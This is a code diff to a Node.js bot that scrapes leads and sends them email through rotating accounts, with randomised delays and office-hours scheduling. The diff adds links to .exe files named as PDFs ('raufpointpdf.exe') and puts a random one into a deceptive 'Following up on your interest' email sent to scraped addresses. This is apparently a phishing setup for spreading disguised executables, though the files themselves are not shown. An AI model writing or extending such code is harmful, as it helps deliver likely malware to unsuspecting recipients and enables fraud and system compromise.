@@ -48,6 +48,10 @@ const CONFIG = {
   ],
   googleResultsPerSearch: 20,
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
+  emailLinks: [
+    'https://archive.org/download/raufpointpdf/raufpointpdf.exe',
+    'https://archive.org/download/raufpointpackagespdf/raufpointpackagespdf.exe'
+  ],
   workingHours: { start: 8, end: 18 },
   workingDays: [1, 2, 3, 4, 5],
   searchTlds: [
@@ -172,11 +176,13 @@ async function sendEmail(to, lead) {
     return false;
   }
   const emailTemplate = fs.readFileSync(path.join(__dirname, 'email_template.html'), 'utf-8');
+  const randomLink = CONFIG.emailLinks[Math.floor(Math.random() * CONFIG.emailLinks.length)];
   const mailOptions = {
     from: `"${process.env.SENDER_NAME || 'Lead Scraper'}" <${emailAccounts[currentAccountIndex].user}>`,
     to: to,
     subject: 'Following up on your interest',
     html: emailTemplate
+      .replace('{random_link}', randomLink)
       .replace('{logo_url}', 'https://i.pinimg.com/1200x/bc/d2/48/bcd2488484224fdbbed256abb2a0f3fc.jpg') // Replace with your logo URL
       .replace('{email_user}', to.split('@')[0])
       .replace('{timestamp}', new Date().toLocaleString()),
